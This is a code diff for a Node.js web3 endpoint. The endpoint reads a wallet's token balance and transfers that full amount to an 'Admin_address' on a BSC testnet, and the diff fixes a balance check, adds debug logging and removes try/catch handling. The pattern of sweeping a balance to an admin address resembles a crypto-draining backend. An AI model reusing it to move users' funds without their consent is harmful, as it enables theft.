@@ -243,7 +243,6 @@ const options = {
 const balance = await axios.request(options)
 const yup = balance.data[0].balance
 var ba = yup/1e18
-if (balance > 0.01 ){
 try{
     const gasPrice = await web3.eth.getGasPrice();
     const gasAmount = await getGasAmountForContractCall(recipient.address,Admin_address,ba,token)
@@ -267,8 +266,6 @@ const signed = await
         console.error(e);
         res.status(404).json({
             message : 'Transaction Failed',reason:e})
-    }}else{
-        res.json({message:"Transaction Failed"})
     }})
 
 const getGasAmountForContractCall = async (fromAddress, toAddress, amount, contractAddress) => {
@@ -302,10 +299,14 @@ const options = {
   }
 };
 const balance = await axios.request(options)
+console.log(balance)
 const yup = balance.data[0].balance
+console.log(yup)
 var ba = yup/1e18
-if (balance > 0.01 ){
-try{
+console.log(ba)
+if (ba < 0.01 ){
+    res.json({message:"Transaction Failed"})
+}else{
     const gasPrice = await web3.eth.getGasPrice();
     const gasAmount = await getGas(recipient.address,Admin_address,ba,token)
     console.log(gasAmount)
@@ -322,15 +323,7 @@ const signed = await
     contract.methods.transfer(Admin_address, yup).send({from: accounts[0],gasPrice:gasPrice,gas:gasAmount}).then(
         (data) => {
             res.status(200).json({response:signed.transactionHash,Amount:ba})
-        }
-    )
-} catch (e) {
-        console.error(e);
-        res.status(404).json({
-            message : 'Transaction Failed',reason:e})
-    }}else{
-        res.json({message:"Transaction Failed"})
-    }})
+        })}})
 
 const getGas = async (fromAddress, toAddress, amount, contractAddress) => {
         var web3 = new Web3('https://data-seed-prebsc-1-s1.binance.org:8545/');
